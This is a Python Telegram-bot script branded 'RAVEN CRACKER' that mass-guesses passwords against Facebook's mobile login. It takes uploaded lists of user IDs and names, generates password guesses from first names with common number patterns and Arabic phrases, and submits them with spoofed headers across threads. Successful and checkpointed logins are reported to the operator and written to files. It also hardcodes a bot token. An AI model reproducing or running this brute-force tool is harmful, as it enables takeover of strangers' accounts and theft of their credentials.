
import os
import telebot
import requests
import random
import re
import time
import subprocess
import webbrowser
from datetime import datetime
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
import hashlib
import pyfiglet

webbrowser.open('https://t.me/h749h')

now = datetime.today()
an = datetime.now()
an2 = datetime(2024, 10, 30, 0, 0)
hours = now.hour

if an > an2 or an == an2:
    print('\x1b[1;31mThe Date : ' + str(an))
    print('\x1b[1;31mThe Exp Date : ' + str(an2))
    time.sleep(1)
    print('\t\n\x1b[1;31m  تــم ايــقــافـ الاداهـ مـن      ')
    print('\x1b[1;31m @ivhso الـــمـــطـــوࢪ  ')
    exit(0)
else:
    print('\n                             اشتراكك صالح لمدة                            ')
    print('\x1b[1;31mالوقت حاليا : ' + str(an))
    print('\n')
    print('𓏳' * 50)
    print('\x1b[1;31m\nوقت الانتهاء : ' + str(an2))
    print('')
    print('𓏳' * 50)
    print('\t\n\x1b[1;31m @ivhso الـــمـــطـــوࢪ   ')
    kilwa = "''print('𓏳'*50)"

script_version = '1.0.0'
current_datetime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
print(f'''\x1b[38;5;190m     \t           Script Version: {script_version}''')
print(f'''\x1b[38;5;174m             Date and Time: {current_datetime}''')
print('\x1b[38;5;150m               Script programmed by Raven')
text = '      Raven'
fig = pyfiglet.Figlet('slant')
formatted_text = fig.renderText(text)
print('\x1b[38;5;99m' + formatted_text + '\x1b[0m')
print('\x1b[38;5;228m')
print('— — — — — — — — — — — — — — — — — — — — — — — ')

bot = telebot.TeleBot("7150526915:AAEuavtB8h8WMHUb47WCnlkmbFc_oYxp3Dg")

console = Console()
webbrowser.open('https://t.me/h749h')
print('—————————————————————————')
print(' • Its running, go to your bot and send /start  √  \n√    تم التشغيل، انتقل إلى البوت الخاص بك وأرسل /start ')
print('——————————————————————————')

id2 = []
ok = 0
cp = 0
loop = 0
status_message_id = None
total_ids = 0

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.reply_to(message, 'مرحبًا! يرجى إرسال الملف الذي يحتوي على ايديات فيسبوك •\nㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ\nPlease send the file containing your Facebook ideas •')

@bot.message_handler(commands=['file'])
def handle_file(message):
    bot.reply_to(message, 'يرجى إرسال الملف الذي يحتوي على ايديات فيسبوك •\nㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ\nPlease send the file containing your Facebook ideas •')

@bot.message_handler(content_types=['document'])
def handle_document(message):
    global total_ids, status_message_id
    chat_id = message.chat.id
    file_id = message.document.file_id
    file_info = bot.get_file(file_id)
    file_url = f'https://api.telegram.org/file/bot{TOKEN}/{file_info.file_path}'
    response = requests.get(file_url)
    if response.status_code == 200:
        with open('uploaded_file.txt', 'wb') as file:
            file.write(response.content)
        with open('uploaded_file.txt', 'r') as file:
            total_ids = sum(1 for _ in file)
        bot.reply_to(message, f'''• تم حفظ الملف بنجاح ✅ \n• عدد الإيديات في الملف: [{total_ids}] 💠 \n• جار بدء الفحص...''')
        status_message = bot.send_message(chat_id, 'الانتظار حتى انتهاء الفحص...')
        status_message_id = status_message.message_id
        process_file('uploaded_file.txt', chat_id)
    else:
        bot.reply_to(message, 'حدث خطأ أثناء تحميل الملف.')

def process_file(file_path, chat_id):
    global id2
    id2 = []
    
    try:
        with open(file_path, 'r') as file:
            id2 = [line.strip() for line in file.readlines()]
    except Exception as e:
        bot.send_message(chat_id, f'''حدث خطأ أثناء قراءة الملف: {str(e)}''')
        return

    if not id2:
        bot.send_message(chat_id, 'الملف فارغ أو لا يحتوي على ايديات.')
        return
    
    passwrd(chat_id)

def passwrd(chat_id):
    global cp, ok, loop
    with tred(5) as pool:
        for yuzong in id2:
            try:
                idf = yuzong.split('|')[0]
                nmf = yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = []
                if len(frs) in range(3, 13):
                    pwv.extend([
                        nmf,                       
                        frs + '123456',
                        frs + '1234567',
                        frs + '12345678',
                        frs + '123456789',
                        frs + '1234567890',
                        frs + '1234@@@@',
                       frs + 'حسوني الحمداني',
                       frs + '123@123',
                       frs + '1q2w3e4r5t',
                       frs + 'حيدر طالب',
                       frs + '12345@12345',
                       frs + 'ابو حمدان',
                       frs + 'حيدر الحمداني',
                       frs + 'حسوني الحمداني',
                       frs + 'علي حسين الحمداني',
                       frs + '12345@@@@@',
                       frs + 'كري جمهور',
                       frs + 'علي حسن',
                       frs + '20222022',
                       frs + 'عباس حسين',
                       frs + '1234554321',
                       frs + 'aassddff',
                       frs + '10002000', 
                       frs + '1@2@3@4@5@', 
                       frs + '11223344@@',
                       frs + '10203040', 
                       frs + 'qqwweerr',
                       frs + 'mmnnbbvv',
                       frs + 'aassddff',
                       frs + '19991999',
                       frs + '19941994',
                       frs + '19931993',
                       frs + '1122334455',
                       frs + '123321',
                       frs + '123123',
                       frs + 'ناجي الاسدي',
                       frs + '1020304050',
                       frs + '19901990',
                       frs + '19911991',
                       frs + '123456123456',
                       frs + '19971997',
                       frs + '1234512345',
                       frs + '1q2w3e4r5t6y',
                       frs + 'سعودي الميرزا',
                        '22446688',
                        '07500750'])
                else:
                    pwv.append(nmf)
                pool.submit(crack, idf, pwv, chat_id)
            except Exception as e:
                bot.send_message(chat_id, f'''حدث خطأ أثناء معالجة الايديات: {str(e)}''')

def crack(idf, pwv, chat_id):
    global cp, ok, loop
    session = requests.Session()
    for pw in pwv:
        try:
            response = session.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', response.text).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', response.text).group(1),
                'uid': idf,
                'next': 'https://p.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pw}
            headers = {
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': random.choice(['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36']),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' }
            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, headers=headers)

            if 'checkpoint' in po.cookies.get_dict().keys():
                bot.send_message(chat_id, f'''CP : {idf} | {pw}''')
                with open('/sdcard/RAVEN-CPS.txt', 'a') as f:
                    f.write(f'''{idf} | {pw}\n''')
                cp += 1

            if 'c_user' in session.cookies.get_dict().keys():
                bot.send_message(chat_id, f'''OK : {idf} | {pw}''')
                with open('/sdcard/RAVEN-OK.txt', 'a') as f:
                    f.write(f'''{idf} | {pw}\n''')
                ok += 1
            
            loop += 1
            if loop % 1 == 0:
                message_text = f'''∈ RAVEN CRACKER\n≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n• عدد الإيديات : {total_ids}\nㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ\n• الفحص : {loop}\nㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ\n• الصحيح : {ok}\nㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ\n• السكيور : {cp}\nㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ\n- PY : @ivhso • @h749h '''
                if status_message_id:
                    bot.edit_message_text(message_text, chat_id, status_message_id)
                else:
                    bot.send_message(chat_id, message_text)

        except requests.exceptions.ConnectionError:
            time.sleep(31)
            continue

if __name__ == '__main__':
    bot.polling(none_stop=True)
